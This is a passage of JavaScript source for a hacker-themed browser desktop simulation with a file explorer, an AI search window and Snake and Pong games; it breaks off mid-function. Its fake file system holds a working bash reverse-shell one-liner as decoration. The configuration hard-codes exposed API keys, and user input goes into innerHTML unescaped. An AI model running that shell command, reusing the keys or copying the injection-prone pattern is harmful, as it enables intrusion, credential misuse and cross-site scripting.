/**
 * DEVDEBUG OS - Desktop Environment Simulation
 * @fileoverview Main application logic for the OS simulation
 */

// ============================================================================
// CONFIGURATION & CONSTANTS
// ============================================================================

/**
 * API Configuration
 * @constant {Object}
 */
const API_CONFIG = {
    OPENCAGE: {
        KEY: '23507e8676a141d688ca761c82fd9294', // TODO: Move to environment variable
        BASE_URL: 'https://api.opencagedata.com/geocode/v1/json'
    },
    GEMINI: {
        URL: "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=",
        KEY: "AIzaSyD4q66eYQv-McwPHEbvqiWvhBCrDVIZzfY" // TODO: Move to environment variable
    }
};

/**
 * UI Constants
 * @constant {Object}
 */
const UI_CONSTANTS = {
    TASKBAR_HEIGHT: 40,
    MIN_WINDOW_WIDTH: 200,
    MIN_WINDOW_HEIGHT: 150,
    DEFAULT_Z_INDEX: 100,
    DRAG_THRESHOLD: 5,
    ICON_SIZE: 36,
    DEFAULT_MUSIC_VOLUME: 0.1,
    DEFAULT_SFX_VOLUME: 0.3
};

/**
 * Game Constants
 * @constant {Object}
 */
const GAME_CONSTANTS = {
    SNAKE: {
        TILE_SIZE: 20,
        GAME_SPEED: 150,
        INITIAL_POSITION: { x: 10, y: 10 }
    },
    TENNIS: {
        WINNING_SCORE: 5,
        FPS: 60,
        BALL_RADIUS: 8,
        INITIAL_BALL_SPEED: 6
    }
};

/**
 * Animation & Timing Constants
 * @constant {Object}
 */
const ANIMATION_CONSTANTS = {
    FADE_DURATION: 500,
    BOOT_DELAY: 1000,
    AUTH_DELAY: 2000,
    RESIZE_DEBOUNCE: 100
};

// ============================================================================
// CORE APPLICATION DATA
// ============================================================================

/**
 * Window Manager - Manages all open windows and their state
 * @type {Object}
 */
const WindowManager = {
    desktop: document.getElementById('desktop'),
    openWindows: {}, // Maps AppID to the window element
    nextZIndex: UI_CONSTANTS.DEFAULT_Z_INDEX,
    windowCounter: 0, // For unique DOM IDs
    isDraggingIcon: false // Flag for icon drag vs. click
};

/**
 * Dynamic File System - Virtual file system structure
 * @type {Object}
 */
const fileSystem = {
            'root': {
                type: 'folder',
                children: {
                    'files': {
                        type: 'folder',
                        children: {
                            'LOG_001.dat': { type: 'file', content: 'System boot sequence initiated...\nKernel loaded successfully.\nAll services started.' },
                            'Matrix_Loop.gif': { type: 'file', content: 'GIF_DATA_STREAM::[...]' },
                            'backdoor_payloads': {
                                type: 'folder',
                                children: {
                                    'reverse_shell.sh': { type: 'file', content: '#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1' }
                                }
                            }
                        }
                    },
                    'system': {
                        type: 'folder',
                        children: {
                            'config.sys': { type: 'file', content: 'DEVICE=C:\\DOS\\HIMEM.SYS\nFILES=30' },
                            'kernel.bin': { type: 'file', content: 'BINARY_DATA::[PROTECTED]' }
                        }
                    },
                    'users': {
                        type: 'folder',
                        children: {
                            
                            'DevDebug': {
                                type: 'folder',
                                children: {
                                    'my_notes.txt': { type: 'file', content: 'TODO:\n- Finish the kernel bypass exploit.\n- Investigate the strange traffic on port 4444.\n- Remember to delete browser history.' },
                                    'secret.txt': { type: 'file', content: 'Project Alpha is a go. The target is the E-Corp mainframe. We move at dawn.' }
                                }
                            }
                        }
                    }
                }
            }
        };

/**
 * Application Registry - Configuration for all available applications
 * @type {Object<string, Object>}
 */
const apps = {
            'browser': {
                title: 'Search', // RENAMED
                icon: 'search',
                initialWidth: 600,
                initialHeight: 450,
                content: '' // Dynamically generated
            },
            'files': {
                title: 'File Explorer',
                icon: 'folder-closed',
                initialWidth: 450,
                initialHeight: 350,
                content: '' // Dynamically generated
            },
            'notes': {
                title: 'Notepad',
                icon: 'sticky-note',
                initialWidth: 400,
                initialHeight: 300,
                content: '' // Dynamically generated
            },
            'robot': {
                title: 'Mr Robot', // UPDATED TITLE
                icon: 'bot-message-square', // UPDATED ICON
                initialWidth: 400,
                initialHeight: 550,
                content: '' // Dynamically generated
            },
            'snake': { 
                title: 'Snake',
                icon: 'spline',
                initialWidth: 450,
                initialHeight: 520,
                content: '' // Dynamically generated
            },
            // 'net-monitor' app removed
            'crypto-utility': { // UPDATED APP NAME AND TITLE
                title: 'Encryptr',
                icon: 'lock-open',
                initialWidth: 650,
                initialHeight: 400,
                content: ''
            },
            'sysmon': {
                title: 'Process Explorer',
                icon: 'activity',
                initialWidth: 400,
                initialHeight: 300,
                content: '' // Dynamically generated
            },
            'system-properties': {
                title: 'System Properties',
                icon: 'info',
                initialWidth: 350,
                initialHeight: 220,
                content: '' // Dynamically generated
            },
            'terminal-tennis': {
                title: 'Tennis',
                icon: 'minus',
                initialWidth: 800,
                initialHeight: 600,
                content: '' // Dynamically generated
            },
            'bin': {
                title: 'Recycle Bin',
                icon: 'trash',
                initialWidth: 400,
                initialHeight: 300,
                content: '' // Dynamically generated
            },
            'terminal': {
                title: 'Terminal',
                icon: 'terminal',
                initialWidth: 600,
                initialHeight: 400,
                content: '' // Dynamically generated
            },
            'devdebug-profile': {
                title: 'User Profile: DevDebug',
                icon: 'user-circle',
                initialWidth: 650,
                initialHeight: 450,
                content: '' // Dynamically generated
            },
            'pixelr': {
                title: 'Pixelr',
                icon: 'paintbrush',
                initialWidth: 600,
                initialHeight: 600,
                content: '' // Dynamically generated
            },
            'settings': {
                title: 'Settings',
                icon: 'settings',
                initialWidth: 700,
                initialHeight: 500,
                content: '' // Dynamically generated
            },
            'map': {
                title: 'Map',
                icon: 'map',
                initialWidth: 800,
                initialHeight: 600,
                content: '' // Dynamically generated
            }
        };

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

/**
 * Formats markdown-style text to HTML
 * @param {string} text - Text to format
 * @returns {string} Formatted HTML string
 */
function formatMarkdown(text) {
    if (!text || typeof text !== 'string') return '';
    let formattedText = text.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
    formattedText = formattedText.replace(/\*(.*?)\*/g, '<strong>$1</strong>');
    return formattedText;
}

/**
 * Fetches with exponential backoff retry logic
 * @param {string} url - URL to fetch
 * @param {Object} options - Fetch options
 * @param {number} maxRetries - Maximum number of retry attempts
 * @returns {Promise<Response>} Fetch response
 * @throws {Error} If all retries fail
 */
async function exponentialBackoffFetch(url, options, maxRetries = 5) {
            for (let i = 0; i < maxRetries; i++) {
                try {
                    const response = await fetch(url, options);
                    if (response.status === 429 && i < maxRetries - 1) {
                        const delay = Math.pow(2, i) * 1000 + Math.random() * 1000;
                        await new Promise(resolve => setTimeout(resolve, delay));
                        continue;
                    }
                    if (!response.ok) {
                        const errorData = await response.json();
                        throw new Error(`API call failed: ${response.status} - ${errorData.error.message}`);
                    }
                    return response;
                } catch (error) {
                    if (i === maxRetries - 1) {
                        throw error;
                    }
                    const delay = Math.pow(2, i) * 1000 + Math.random() * 1000;
                    await new Promise(resolve => setTimeout(resolve, delay));
                }
            }
        }
// ============================================================================
// APPLICATION INITIALIZERS
// ============================================================================

// --- BROWSER APP FUNCTIONS ---
        
        function loadHistoryState(windowElement, state) {
            const contentArea = windowElement.querySelector('#browser-content-area');
            const urlInput = windowElement.querySelector('#browser-url');
            const backButton = windowElement.querySelector('#browser-back-btn');
            const forwardButton = windowElement.querySelector('#browser-forward-btn');
            urlInput.value = state.query;
            contentArea.innerHTML = state.htmlContent;
            backButton.disabled = windowElement.historyIndex <= 0;
            forwardButton.disabled = windowElement.historyIndex >= windowElement.browserHistory.length - 1;
        }

        function goBack(windowElement) {
            if (windowElement.historyIndex > 0) {
                windowElement.historyIndex--;
                loadHistoryState(windowElement, windowElement.browserHistory[windowElement.historyIndex]);
            }
        }

        function goForward(windowElement) {
            if (windowElement.historyIndex < windowElement.browserHistory.length - 1) {
                windowElement.historyIndex++;
                loadHistoryState(windowElement, windowElement.browserHistory[windowElement.historyIndex]);
            }
        }
        
        async function navigateOrSearch(windowElement, query, isInternal = false) {
            const contentArea = windowElement.querySelector('#browser-content-area');
            const urlInput = windowElement.querySelector('#browser-url');
            const searchButton = windowElement.querySelector('#browser-search-btn');
            const progressBar = windowElement.querySelector('#browser-progress-bar');
            const originalQuery = query;

            let isURL = query.toLowerCase().startsWith('http://') || query.toLowerCase().startsWith('https://') || query.toLowerCase().startsWith('www.');
            
            if (isURL && !isInternal) {
                if (query.match(/google\.com|bing\.com|yahoo\.com/i)) {
                    contentArea.innerHTML = `
                        <div class="text-center p-8" style="background-color: rgba(255,0,0,0.1); border: 1px solid var(--danger-color);">
                            <h3 class="text-xl font-bold mb-3" style="color: var(--danger-color);">SECURITY BREACH DETECTED: ACCESS DENIED</h3>
                            <p style="color: var(--danger-color); opacity: 0.8;">Direct external URL access is restricted by DEVDEBUG OS kernel policies.</p>
                            <p class="text-green-500 text-opacity-70 mt-3">Hint: Use the search bar for queries, not full URLs.</p>
                        </div>
                    `;
                    urlInput.disabled = false;
                    searchButton.disabled = false;
                    searchButton.innerHTML = 'GO';
                    urlInput.focus();
                    return; 
                }
            }

            if (isURL) {
                contentArea.innerHTML = `<div class="text-center p-8" style="background-color: var(--primary-color-darker); border: 1px solid var(--primary-color-dark);"><h3 class="text-xl font-bold mb-3" style="color: var(--primary-color);">Processing: ${query}</h3><p style="color: var(--text-color-dim); opacity: 0.7;">(Simulation protocol restricts direct external page access. Displaying a data summary.)</p></div>`;
                query = query.replace(/^(https?:\/\/)?(www\.)?/, '');
            } else {
                 contentArea.innerHTML = `<div class="text-center p-8" style="color: var(--text-color-dim);">Executing SEARCH for "${query}"...</div>`;
            }
            
            urlInput.disabled = true;
            searchButton.disabled = true;
            searchButton.innerHTML = '<span class="text-red-500 font-mono">STOP</span>';
            
            windowElement.querySelector('#browser-refresh-btn').disabled = true;

            progressBar.classList.remove('hidden');
            progressBar.style.width = '0%';
            
            await new Promise(resolve => setTimeout(resolve, 100));
            progressBar.style.width = '50%';
            
            const systemPrompt = "You are a web search engine assistant. Summarize the requested information concisely and clearly based on the web results provided. Do not include a conversational preamble or sign-off, just the information.";

            const payload = {
                contents: [{ parts: [{ text: query }] }],
                tools: [{ "google_search": {} }],
                systemInstruction: { parts: [{ text: systemPrompt }] },
            };

            const options = {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            };
            
            let finalHtmlContent = '';

            try {
                const response = await exponentialBackoffFetch(API_CONFIG.GEMINI.URL + API_CONFIG.GEMINI.KEY, options);
                const result = await response.json();
                const candidate = result.candidates?.[0];

                if (candidate && candidate.content?.parts?.[0]?.text) {
                    const text = candidate.content.parts[0].text;
                    let sources = [];
                    const groundingMetadata = candidate.groundingMetadata;

                    if (groundingMetadata && groundingMetadata.groundingAttributions) {
                        sources = groundingMetadata.groundingAttributions
                            .map(attribution => ({
                                uri: attribution.web?.uri,
                                title: attribution.web?.title,
                            }))
                            .filter(source => source.uri && source.title);
                    }

                    finalHtmlContent = `<h3 class="text-lg font-bold mb-3" style="color: var(--primary-color);">${isURL ? 'DATA_STREAM for ' + originalQuery : 'SEARCH RESULTS for: "' + query + '"'}</h3>`;
                    finalHtmlContent += `<div class="p-4 mb-4 leading-relaxed" style="background-color: var(--primary-color-darker); border: 1px solid var(--primary-color-dark);">${formatMarkdown(text)}</div>`;

                    if (sources.length > 0) {
                        finalHtmlContent += `<h4 class="text-sm font-semibold mb-2" style="color: var(--text-color-dim);">ATTRIBUTION:</h4>`;
                        finalHtmlContent += `<ul class="list-disc list-inside space-y-1 text-xs pl-4">`;
                        sources.forEach((source, index) => {
                        finalHtmlContent += `<li><a href="#" data-internal-link="${source.uri}" class="internal-link transition-colors" style="color: var(--accent-color);" title="${source.uri}">[${index + 1}] ${source.title}</a></li>`;
                        });
                        finalHtmlContent += `</ul>`;
                    }

                    contentArea.innerHTML = finalHtmlContent; 

                } else {
                    finalHtmlContent = `<div class="text-red-500 p-4">ACCESS DENIED: Could not retrieve external data for "${query}".</div>`;
                    contentArea.innerHTML = finalHtmlContent;
                }

            } catch (error) {
                console.error("Browser Search Error:", error);
                finalHtmlContent = `<div style="color: var(--danger-color);" class="p-4">API CONNECTION ERROR: ${error.message}. Check console for details.</div>`;
                contentArea.innerHTML = finalHtmlContent;
            } finally {
                progressBar.style.width = '100%';
                await new Promise(resolve => setTimeout(resolve, 200));
                progressBar.classList.add('hidden');

                urlInput.disabled = false;
                searchButton.disabled = false;
                searchButton.innerHTML = 'GO';
                windowElement.querySelector('#browser-refresh-btn').disabled = false;
                urlInput.focus();

                if (!isInternal) {
                    const newState = { query: originalQuery, htmlContent: finalHtmlContent };
                    
                    if (windowElement.historyIndex < windowElement.browserHistory.length - 1) {
                        windowElement.browserHistory = windowElement.browserHistory.slice(0, windowElement.historyIndex + 1);
                    }
                    
                    windowElement.browserHistory.push(newState);
                    windowElement.historyIndex = windowElement.browserHistory.length - 1;
                    
                    const backButton = windowElement.querySelector('#browser-back-btn');
                    const forwardButton = windowElement.querySelector('#browser-forward-btn');
                    backButton.disabled = windowElement.historyIndex <= 0;
                    forwardButton.disabled = true;
                }
            }
        }

        function initializeBrowserWindow(windowElement) {
            windowElement.browserHistory = [];
            windowElement.historyIndex = -1;

            windowElement.querySelector('.window-content').innerHTML = `
                <div class="flex flex-col h-full bg-black">
                    <!-- Address Bar and Navigation Controls -->
                    <div class="p-2 flex-shrink-0" style="background-color: var(--primary-color-darker); border-bottom: 1px solid var(--primary-color-dark);">
                        <div class="flex items-center space-x-1">
                            <!-- Navigation Buttons -->
                            <button id="browser-back-btn" title="Back" disabled
                                class="font-bold py-1 px-2 rounded-none transition-colors text-sm disabled:opacity-30 disabled:cursor-not-allowed" style="background-color: var(--primary-color-dark); color: var(--text-color-dim); border: 1px solid var(--primary-color-dark);">
                                &#9664;
                            </button>
                            <button id="browser-forward-btn" title="Forward" disabled
                                class="font-bold py-1 px-2 rounded-none transition-colors text-sm disabled:opacity-30 disabled:cursor-not-allowed" style="background-color: var(--primary-color-dark); color: var(--text-color-dim); border: 1px solid var(--primary-color-dark);">
                                &#9654;
                            </button>
                            <!-- Refresh Button -->
                            <button id="browser-refresh-btn" title="Refresh"
                                class="font-bold py-1 px-2 rounded-none transition-colors text-sm" style="background-color: var(--primary-color-dark); color: var(--text-color-dim); border: 1px solid var(--primary-color-dark);">
                                &#x21BB;
                            </button>
                            
                            <!-- URL/Search Input -->
                            <input type="text" id="browser-url" value=""
                                class="flex-grow p-2 bg-black rounded-none focus:ring-1 focus:outline-none text-sm" style="color: var(--primary-color); border: 1px solid var(--primary-color-dark); --ring-color: var(--primary-color);"
                                placeholder="EXECUTE or SEARCH"/>
                                
                            <!-- Go/Refresh/Stop Button -->
                            <button id="browser-search-btn"
                                class="text-black font-bold py-1 px-3 rounded-none transition-colors text-sm border border-black" style="background-color: var(--primary-color);">
                                GO
                            </button>
                        </div>
                        <!-- Loading Progress Bar -->
                        <div id="browser-progress-bar" class="h-0.5 mt-2 hidden transition-all duration-300 ease-linear" style="background-color: var(--accent-color);"></div>
                    </div>
                    
                    <!-- Content Area -->
                    <div id="browser-content-area" class="flex-grow overflow-y-auto p-4 bg-black text-sm">
                        <!-- Initial Content -->
                        <div class="p-4" style="background-color: var(--primary-color-darker); border: 1px solid var(--primary-color-dark);">
                            <p class="font-bold mb-1" style="color: var(--primary-color);">:: INITIALIZING WEB ACCESS ::</p>
                            <p style="color: var(--text-color-dim); opacity: 0.7;">Enter a query or target above and execute 'GO' to initiate a Google-grounded data retrieval via the Gemini API.</p>
                        </div>
                    </div>
                </div>
            `;

            const urlInput = windowElement.querySelector('#browser-url');
            const searchButton = windowElement.querySelector('#browser-search-btn');
            const backButton = windowElement.querySelector('#browser-back-btn');
            const forwardButton = windowElement.querySelector('#browser-forward-btn');
            const refreshButton = windowElement.querySelector('#browser-refresh-btn');

            const handleAction = () => {
                const query = urlInput.value.trim();
                if (query) {
                    navigateOrSearch(windowElement, query, false);
                }
            };
            
            backButton.addEventListener('click', () => goBack(windowElement));
            forwardButton.addEventListener('click', () => goForward(windowElement));
            
            const handleRefresh = () => {
                const query = urlInput.value.trim();
                if (query) {
                    navigateOrSearch(windowElement, query, true);
                }
            };
            refreshButton.addEventListener('click', handleRefresh);

            searchButton.addEventListener('click', handleAction);
            urlInput.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') {
                    handleAction();
                }
            });
        }


/**
 * Initializes the Snake game window
 * @param {HTMLElement} windowElement - The window element to initialize
 */
function initializeSnakeWindow(windowElement) {
            windowElement.querySelector('.window-content').innerHTML = `
                <div class="flex flex-col h-full bg-black">
                    <!-- Enhanced Header -->
                    <div class="flex justify-between items-center p-3 flex-shrink-0" style="background-color: var(--primary-color-darker); border-bottom: 2px solid var(--primary-color);">
                        <div class="flex items-center space-x-4">
                            <div class="flex items-center space-x-2">
                                <i data-lucide="activity" class="w-4 h-4" style="color: var(--primary-color);"></i>
                                <span class="text-xs font-bold" style="color: var(--text-color-dim);">STATUS:</span>
                                <span id="game-status" class="text-sm font-bold px-2 py-1 rounded" style="color: var(--accent-color); background-color: rgba(0, 255, 255, 0.1);">READY</span>
                            </div>
                        </div>
                        <div class="flex items-center space-x-6">
                            <div class="flex items-center space-x-2">
                                <i data-lucide="trophy" class="w-4 h-4" style="color: var(--accent-color);"></i>
                                <span class="text-xs font-bold" style="color: var(--text-color-dim);">SCORE:</span>
                                <span id="snake-score" class="text-xl font-mono font-bold px-3 py-1 rounded" style="color: var(--accent-color); background-color: rgba(0, 255, 255, 0.1); min-width: 60px; text-align: center;">0</span>
                            </div>
                            <div class="flex items-center space-x-2">
                                <i data-lucide="star" class="w-4 h-4" style="color: var(--danger-color);"></i>
                                <span class="text-xs font-bold" style="color: var(--text-color-dim);">BEST:</span>
                                <span id="snake-high-score" class="text-sm font-mono font-bold px-2 py-1 rounded" style="color: var(--danger-color); background-color: rgba(255, 69, 0, 0.1);">0</span>
                            </div>
                        </div>
                    </div>

                    <!-- Game Canvas Container with Grid Background -->
                    <div id="snake-container" class="flex-grow flex items-center justify-center relative" style="background: repeating-linear-gradient(0deg, transparent, transparent 19px, rgba(0, 255, 65, 0.05) 19px, rgba(0, 255, 65, 0.05) 20px), repeating-linear-gradient(90deg, transparent, transparent 19px, rgba(0, 255, 65, 0.05) 19px, rgba(0, 255, 65, 0.05) 20px);">
                        <canvas id="snake-canvas" width="400" height="400"></canvas>
                    </div>

                    <!-- Enhanced Footer with Controls -->
                    <div class="p-3 flex-shrink-0" style="background-color: var(--primary-color-darker); border-top: 2px solid var(--primary-color);">
                        <div class="flex items-center justify-between">
                            <div class="flex items-center space-x-4 text-xs" style="color: var(--text-color-dim);">
                                <div class="flex items-center space-x-1">
                                    <i data-lucide="arrow-up" class="w-3 h-3"></i>
                                    <i data-lucide="arrow-down" class="w-3 h-3"></i>
                                    <i data-lucide="arrow-left" class="w-3 h-3"></i>
                                    <i data-lucide="arrow-right" class="w-3 h-3"></i>
                                    <span class="ml-1">Move</span>
                                </div>
                                <div class="flex items-center space-x-1">
                                    <span class="px-1.5 py-0.5 rounded" style="background-color: var(--primary-color-dark);">SPACE</span>
                                    <span>Pause/Start</span>
                                </div>
                            </div>
                            <div class="text-xs" style="color: var(--text-color-dim); opacity: 0.7;">
                                Length: <span id="snake-length" class="font-bold" style="color: var(--primary-color);">3</span>
                            </div>
                        </div>
                    </div>
                </div>
            `;

            const canvas = windowElement.querySelector('#snake-canvas');
            const ctx = canvas.getContext('2d');
            const scoreDisplay = windowElement.querySelector('#snake-score');
            const statusDisplay = windowElement.querySelector('#game-status');
            const highScoreDisplay = windowElement.querySelector('#snake-high-score');
            const lengthDisplay = windowElement.querySelector('#snake-length');
            
            // Initialize icons
            lucide.createIcons({ nodes: windowElement.querySelectorAll('[data-lucide]') });
            
            // High score from localStorage
            let highScore = parseInt(localStorage.getItem('snakeHighScore') || '0', 10);
            highScoreDisplay.textContent = highScore;
            
            // Game Constants
            const tileSize = GAME_CONSTANTS.SNAKE.TILE_SIZE;
            const tileCount = canvas.width / tileSize;
            const gameSpeed = GAME_CONSTANTS.SNAKE.GAME_SPEED;
            
            // --- Game State ---
            let snake;
            let food;
            let velocity; // {x, y}
            let score;
            let inputQueue; // To handle rapid key presses
            let isGameOver;
            let isPaused;
            let gameInterval = null;
            let foodPulse = 0; // For food animation

            const generateFood = () => {
                let newFood;
                let onSnake;
                
                do {
                    onSnake = false;
                    // Generate random grid coordinates
                    newFood = {
                        x: Math.floor(Math.random() * tileCount),
                        y: Math.floor(Math.random() * tileCount)
                    };
                    // Check if the new food overlaps with the snake
                    for (const segment of snake) {
                        if (segment.x === newFood.x && segment.y === newFood.y) {
                            onSnake = true;
                            break;
                        }
                    }
                } while (onSnake);
                
                food = newFood;
            };
            
            const drawRect = (x, y, color, isHead = false) => {
                const pixelX = x * tileSize;
                const pixelY = y * tileSize;
                const size = tileSize - 2;
                
                // Draw with rounded corners effect
                ctx.fillStyle = color;
                ctx.fillRect(pixelX + 1, pixelY + 1, size, size);
                
                // Add highlight for head
                if (isHead) {
                    ctx.fillStyle = 'rgba(255, 255, 255, 0.3)';
                    ctx.fillRect(pixelX + 2, pixelY + 2, size - 4, size - 4);
                }
            };

            const drawFood = (x, y) => {
                const pixelX = x * tileSize;
                const pixelY = y * tileSize;
                const pulseSize = 2 + Math.sin(foodPulse) * 1;
                const size = tileSize - pulseSize;
                
                const themeStyles = getComputedStyle(document.documentElement);
                const dangerColor = themeStyles.getPropertyValue('--danger-color').trim();
                
                // Outer glow
                ctx.shadowBlur = 10;
                ctx.shadowColor = dangerColor;
                ctx.fillStyle = dangerColor;
                ctx.fillRect(pixelX + pulseSize/2, pixelY + pulseSize/2, size, size);
                ctx.shadowBlur = 0;
                
                // Inner highlight
                ctx.fillStyle = 'rgba(255, 255, 255, 0.4)';
                ctx.fillRect(pixelX + pulseSize/2 + 2, pixelY + pulseSize/2 + 2, size - 4, size - 4);
            };

            const drawMessage = (title, subtitle, color, showRestart = false) => {
                // Dark overlay with slight transparency
                ctx.fillStyle = 'rgba(0, 0, 0, 0.9)';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                
                // Title
                ctx.fillStyle = color;
                ctx.font = 'bold 32px Consolas, Monospace';
                ctx.textAlign = 'center';
                ctx.textBaseline = 'middle';
                
                // Add text shadow for better visibility
                ctx.shadowColor = 'rgba(0, 0, 0, 0.8)';
                ctx.shadowBlur = 10;
                ctx.shadowOffsetX = 2;
                ctx.shadowOffsetY = 2;
                
                ctx.fillText(title, canvas.width / 2, canvas.height / 2 - 30);
                
                // Subtitle
                ctx.font = '16px Consolas, Monospace';
                ctx.fillStyle = 'rgba(255, 255, 255, 0.8)';
                ctx.fillText(subtitle, canvas.width / 2, canvas.height / 2 + 10);
                
                if (showRestart) {
                    ctx.font = '14px Consolas, Monospace';
                    ctx.fillStyle = 'rgba(255, 255, 255, 0.6)';
                    ctx.fillText('Press SPACE to restart', canvas.width / 2, canvas.height / 2 + 35);
                }
                
                ctx.shadowBlur = 0;
            };
            
            const drawGame = () => {
                // Draw background (grid is handled by CSS)
                ctx.fillStyle = 'rgba(0, 0, 0, 0.3)';
                ctx.fillRect(0, 0, canvas.width, canvas.height);

                // Get current theme colors
                const themeStyles = getComputedStyle(document.documentElement);
                const primaryColor = themeStyles.getPropertyValue('--primary-color').trim();
                const accentColor = themeStyles.getPropertyValue('--accent-color').trim();
                const dangerColor = themeStyles.getPropertyValue('--danger-color').trim();

                // Animate food pulse
                foodPulse += 0.2;
                
                // Draw food with animation
                drawFood(food.x, food.y);

                // Draw snake with improved visuals
                snake.forEach((segment, index) => {
                    const isHead = index === 0;
                    const color = isHead ? accentColor : primaryColor;
                    drawRect(segment.x, segment.y, color, isHead);
                });
                
                // Update displays
                scoreDisplay.textContent = score;
                lengthDisplay.textContent = snake.length;

                if (isPaused) {
                    statusDisplay.textContent = 'PAUSED';
                    statusDisplay.style.backgroundColor = 'rgba(0, 255, 255, 0.2)';
                    drawMessage("PAUSED", "Press SPACE to resume.", accentColor);
                } else if (isGameOver) {
                    statusDisplay.textContent = 'GAME OVER';
                    statusDisplay.style.backgroundColor = 'rgba(255, 69, 0, 0.2)';
                    if (gameInterval) clearInterval(gameInterval);
                    drawMessage("GAME OVER", `Final Score: ${score} | Length: ${snake.length}`, dangerColor, true);
                } else {
                    statusDisplay.textContent = 'RUNNING';
                    statusDisplay.style.backgroundColor = 'rgba(0, 255, 65, 0.2)';
                }
            };
            
            const checkSelfCollision = (head) => {
                // Check if the new head position hits any existing body segment
                for (let i = 1; i < snake.length; i++) {
                    if (head.x === snake[i].x && head.y === snake[i].y) {
                        return true;
                    }
                }
                return false;
            };

            const updateGame = () => {
                // Process the next input from the queue
                if (inputQueue.length > 0) {
                    const nextVelocity = inputQueue.shift();
                    // Prevent reversing into self
                    if (nextVelocity.x !== -velocity.x || nextVelocity.y !== -velocity.y) {
                        velocity = nextVelocity;
                    }
                }

                const head = {x: snake[0].x + velocity.x, y: snake[0].y + velocity.y};

                // Check for collision (Wall or Self)
                if (head.x < 0 || head.x >= tileCount || head.y < 0 || head.y >= tileCount || checkSelfCollision(head)) {
                    isGameOver = true;
                    return;
                }

                // Add new head
                snake.unshift(head);

                // Check for food consumption
                if (head.x === food.x && head.y === food.y) {
                    score++;
                    // Update high score in real-time
                    if (score > highScore) {
                        highScore = score;
                        localStorage.setItem('snakeHighScore', highScore.toString());
                        highScoreDisplay.textContent = highScore;
                    }
                    generateFood(); // Grow the snake and place new food
                } else {
                    snake.pop(); // Remove tail if no food eaten
                }
            };
            
            const resetGame = () => {
                // Update high score if needed
                if (score > highScore) {
                    highScore = score;
                    localStorage.setItem('snakeHighScore', highScore.toString());
                    highScoreDisplay.textContent = highScore;
                }
                
                // Fixed starting position and length
                const initPos = GAME_CONSTANTS.SNAKE.INITIAL_POSITION;
                snake = [{x: initPos.x, y: initPos.y}, {x: initPos.x - 1, y: initPos.y}, {x: initPos.x - 2, y: initPos.y}]; 
                velocity = { x: 1, y: 0 }; // Start moving right
                score = 0;
                isGameOver = false;
                inputQueue = [];
                isPaused = true;
                foodPulse = 0;
                scoreDisplay.textContent = '0';
                lengthDisplay.textContent = '3';
                statusDisplay.textContent = 'READY';
                statusDisplay.style.backgroundColor = 'rgba(0, 255, 65, 0.1)';
                generateFood();
                drawGame();
            };
            
            const gameLoop = () => {
                if (!isPaused && !isGameOver) {
                    updateGame();
                    drawGame();
                } else if (isGameOver) {
                    statusDisplay.textContent = 'GAME OVER';
                    // Stop the interval and draw the game over screen
                    if (gameInterval) clearInterval(gameInterval);
                    drawGame();
                }
            };
            
            const startGameLoop = () => {
                if (gameInterval) clearInterval(gameInterval);
                gameInterval = setInterval(gameLoop, gameSpeed);
            };

            // Input Handler
            const keyHandler = (e) => {
                // Only process keys if the snake window is the active (top-most) window.
                if (parseInt(windowElement.style.zIndex) !== WindowManager.nextZIndex) {
                    return; 
                }

                if (e.key === ' ' || e.key === 'Spacebar') {
                    e.preventDefault();
                    if (isGameOver) {
                        // Update high score before restarting
                        if (score > highScore) {
                            highScore = score;
                            localStorage.setItem('snakeHighScore', highScore.toString());
                            highScoreDisplay.textContent = highScore;
                        }
                        // Restart the game completely
                        resetGame();
                        isPaused = false;
                        startGameLoop();
                        return;
                    }
                    
                    // Pause/Unpause
                    isPaused = !isPaused;
                    if (!isPaused) {
                        startGameLoop();
                        statusDisplay.textContent = 'RUNNING';
                    } else {
                        if (gameInterval) clearInterval(gameInterval);
                    }
                    drawGame();
                    return;
                }

                if (isPaused || isGameOver) return;
                
                // Queue the input instead of setting it directly
                switch(e.key) {
                    case 'ArrowLeft':
                    case 'a':
                        inputQueue.push({ x: -1, y: 0 });
                        break;
                    case 'ArrowUp':
                    case 'w':
                        inputQueue.push({ x: 0, y: -1 });
                        break;
                    case 'ArrowRight':
                    case 'd':
                        inputQueue.push({ x: 1, y: 0 });
                        break;
                    case 'ArrowDown':
                    case 's':
                        inputQueue.push({ x: 0, y: 1 });
                        break;
                }
            };
            
            // Attach the listener to the document, assuming the game is played when window is open.
            document.addEventListener('keydown', keyHandler);

            // Cleanup function
            windowElement.cleanup = () => {
                document.removeEventListener('keydown', keyHandler);
                if (gameInterval) clearInterval(gameInterval);
            };

            // Initial setup
            resetGame();
            const primaryColor = getComputedStyle(document.documentElement).getPropertyValue('--primary-color').trim();
            drawMessage("PRESS SPACE TO START", "Use Arrow Keys or WASD to move", primaryColor);
        }

/**
 * Initializes the Terminal Tennis (Pong) game window
 * @param {HTMLElement} windowElement - The window element to initialize
 */
function initializeTerminalTennisWindow(windowElement) {
            windowElement.querySelector('.window-content').innerHTML = `
                <div class="flex flex-col h-full bg-black">
                    <!-- Minimal Header -->
                    <div class="flex justify-center items-center p-2" style="background-color: var(--primary-color-darker); border-bottom: 1px solid var(--primary-color-dark);">
                        <span id="player-score" class="text-2xl font-mono font-bold px-4" style="color: var(--accent-color);">0</span>
                        <span class="text-xl px-2" style="color: var(--primary-color);">|</span>
                        <span id="cpu-score" class="text-2xl font-mono font-bold px-4" style="color: var(--danger-color);">0</span>
                    </div>

                    <!-- Game Canvas -->
                    <div id="tennis-container" class="flex-grow flex items-center justify-center relative bg-black">
                        <canvas id="pong-canvas" class="cursor-none"></canvas>
                    </div>
                </div>
            `;

            const canvas = windowElement.querySelector('#pong-canvas');
            const ctx = canvas.getContext('2d');
            const playerScoreEl = windowElement.querySelector('#player-score');
            const cpuScoreEl = windowElement.querySelector('#cpu-score');

            let gameInterval = null;
            let gameOver = false;
            const WINNING_SCORE = GAME_CONSTANTS.TENNIS.WINNING_SCORE;

            // Game objects - will be initialized after canvas is sized
            let ball, player, cpu, net;

            const drawRect = (x, y, w, h, color) => {
                ctx.fillStyle = color;
                ctx.fillRect(x, y, w, h);
            };
            
            const drawCircle = (x, y, r, color) => {
                ctx.fillStyle = color;
